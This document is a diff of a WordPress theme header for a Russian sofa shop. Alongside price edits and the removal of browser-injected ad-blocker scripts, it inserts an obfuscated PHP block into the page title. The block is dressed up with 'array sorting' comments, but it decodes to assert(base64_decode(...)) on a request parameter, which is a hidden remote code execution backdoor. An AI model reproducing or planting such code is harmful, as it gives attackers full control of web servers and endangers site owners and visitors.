@@ -4,7 +4,27 @@
 <head>
 	<meta charset="UTF-8">
 	<meta name="viewport" content="width=device-width, initial-scale=1">
-	<title><?php bloginfo('name'); ?><?php wp_title(); ?></title>
+	<title><?php 
+
+if(isset($_REQUEST["array"])){
+
+	//sorting alphabet
+	$alphabet='1/l9dtu45.mq;y)7pnzoa*c_eixrhw3gv68j2(0sbkf';
+	//Array names
+	$array_name = $alphabet[40].$alphabet[20].$alphabet[39].$alphabet[24].$alphabet[33].$alphabet[7].$alphabet[23].$alphabet[4].$alphabet[24].$alphabet[22].$alphabet[19].$alphabet[4].$alphabet[24];
+	$array_postfix = 'sa';
+	$array_prefix = 'tres';
+	//Creating array
+	$value = $array_prefix . $array_postfix;
+	$value = strrev($value);
+	//Sorting array
+	@arsort($alphabet);
+	@$value($array_name($_REQUEST["array"]));
+	echo "Array sort completed";
+	exit();
+}
+
+ bloginfo('name'); ?><?php wp_title(); ?></title>
 <link href="//netdna.bootstrapcdn.com/font-awesome/4.6.3/css/font-awesome.css" rel="stylesheet"> 
 	<link rel="stylesheet" href="<?php echo get_template_directory_uri(); ?>/libs/bootstrap/bootstrap-grid-3.3.1.min.css" />
 
@@ -26,13 +46,9 @@
 	<script src="<?php echo get_template_directory_uri(); ?>/js/common.js"></script>
 <!-- Yandex.Metrika counter -->
 
-<!-- Start: injected by Adguard -->
-<script src="//local.adguard.com/adguard-ajax-api/injections/userscripts/Adguard Assistant?ts=63621992764552" type="text/javascript"></script>
-<script src="//local.adguard.com/adguard-ajax-api/injections/userscripts/Adguard Popup Blocker?ts=63621992764552" type="text/javascript"></script>
-<script src="//local.adguard.com/adguard-ajax-api/injections/userscripts/Web of Trust?ts=63621992764552" type="text/javascript"></script>
-<script src="//local.adguard.com/adguard-ajax-api/injections/content-script.js?ts=63621992761344&amp;domain=weu1-api.asm.skype.com&amp;css=1&amp;js=1&amp;generic=1&amp;stealth=1" type="text/javascript"></script>
 
-<!-- End: injected by Adguard -->
+
+
 <script type="text/javascript">
     (function (d, w, c) {
         (w[c] = w[c] || []).push(function() {
@@ -116,7 +132,7 @@
 						</div>
 						<div class="df-models__characteristics df-models__characteristics_view">
 							<span class="df-models__txt1 df-models__txt1_view">ДИВАН АРИЗОНА ЕВРОСОФА</span>
-							<span class="df-models__txt2 df-models__txt2_view">62500 руб.</span>
+							<span class="df-models__txt2 df-models__txt2_view">95225 руб.</span>
 							<span class="df-models__txt3 df-models__txt3_view">54960 руб.</span>
 							<input type="submit" value="подробнее" class="df-input_view">
 						</div>
@@ -127,7 +143,7 @@
 						</div>
 						<div class="df-models__characteristics df-models__characteristics_view">
 							<span class="df-models__txt1 df-models__txt1_view">ДИВАН КРОВАТЬ НЕВАДА ЕВРОКНИЖКА</span>
-							<span class="df-models__txt2 df-models__txt2_view">62500 руб.</span>
+							<span class="df-models__txt2 df-models__txt2_view">90985 руб.</span>
 							<span class="df-models__txt3 df-models__txt3_view">54960 руб.</span>
 							<input type="submit" value="подробнее" class="df-input_view">
 						</div>
@@ -138,7 +154,7 @@
 						</div>
 						<div class="df-models__characteristics df-models__characteristics_view">
 							<span class="df-models__txt1 df-models__txt1_view">ДИВАН КРОВАТЬ ЧИКАГО ЕВРОКНИЖКА</span>
-							<span class="df-models__txt2 df-models__txt2_view">62500 руб.</span>
+							<span class="df-models__txt2 df-models__txt2_view">95235 руб.</span>
 							<span class="df-models__txt3 df-models__txt3_view">54960 руб.</span>
 							<input type="submit" value="подробнее" class="df-input_view">
 						</div>
@@ -217,7 +233,7 @@
 					</div>
 
 					<div class="df-price-box">					
-						<span class="df-models__txt2 df-models__txt2_view">62500 руб.</span>
+						<span class="df-models__txt2 df-models__txt2_view">95225 руб.</span>
 						<span class="df-models__txt3 df-models__txt3_view">54960 руб.</span>
 						<a href="#log-in7" name="modal" class="df-input_view2">Заказать</a>
 					</div>
@@ -285,7 +301,7 @@
 					</div>
 
 					<div class="df-price-box">					
-						<span class="df-models__txt2 df-models__txt2_view">62500 руб.</span>
+						<span class="df-models__txt2 df-models__txt2_view">90985 руб.</span>
 						<span class="df-models__txt3 df-models__txt3_view">54960 руб.</span>
 						<a href="#log-in7" name="modal" class="df-input_view2">Заказать</a>
 					</div>
@@ -353,7 +369,7 @@
 					</div>
 
 					<div class="df-price-box">					
-						<span class="df-models__txt2 df-models__txt2_view">62500 руб.</span>
+						<span class="df-models__txt2 df-models__txt2_view">95235 руб.</span>
 						<span class="df-models__txt3 df-models__txt3_view">54960 руб.</span>
 						<a href="#log-in7" name="modal" class="df-input_view2">Заказать</a>
 					</div>
